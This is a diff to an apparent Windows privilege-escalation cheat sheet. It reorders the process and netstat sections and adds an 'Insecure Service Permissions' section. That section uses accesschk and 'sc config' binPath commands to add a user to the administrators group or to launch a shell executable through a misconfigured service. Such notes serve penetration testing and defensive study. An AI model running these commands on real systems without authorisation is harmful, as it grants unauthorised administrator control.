@@ -203,12 +203,6 @@ whoami
 nt authority\system
 ```
 
-## Processes and Services
-
-``` bash
-tasklist /SVC
-```
-
 ## Scheduled Tasks
 
 ``` bash
@@ -219,7 +213,45 @@ schtasks /query /fo LIST /v
 schtasks /query /fo LIST /v | findstr /B /C:"Task To Run" /C:"Next Run Time" /C:"Last Run Time" /C:"Schedule Type" /C:"Start Time" /C:"Start Date"
 ```
 
+## Processes and Services
+
+``` bash
+tasklist /SVC
+```
+
+Active network connection
+
+``` bash
+netstat -ano
+```
+
+### Insecure Service Permissions
+
+``` bash
+sc qc Apache
+```
+
+``` bash
+accesschk64.exe -uwcqv <user> *
+```
+
+==> `Service All Access` or `Service Change Config`
+
+``` bash
+sc config "service" binPath= "net localgroup administrators user /add"
+```
+
+``` bash
+sc config "service" binPath= "c:\users\public\shell.exe"
+```
+
+[https://asfiyashaikh.medium.com/windows-privesc-weak-service-permission-b90f3bf4d44f](https://asfiyashaikh.medium.com/windows-privesc-weak-service-permission-b90f3bf4d44f)
+
+[https://medium.com/@orhan_yildirim/windows-privilege-escalation-insecure-service-permissions-e4f33dbff219](https://medium.com/@orhan_yildirim/windows-privilege-escalation-insecure-service-permissions-e4f33dbff219)
+
 ## Readable/Writable
+
+Using accesschk
 
 ``` bash
 accesschk.exe -accepteula
@@ -229,7 +261,7 @@ accesschk.exe -accepteula
 accesschk.exe -uws <user> "C:\Program Files"
 ```
 
-Using powershell >>>
+Using powershell
 
 ``` bash
 Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
@@ -405,12 +437,6 @@ ipconfig /all
 
 ``` bash
 route print
-```
-
-Active network connection
-
-``` bash
-netstat -ano
 ```
 
 ## Firewall Status and Rules
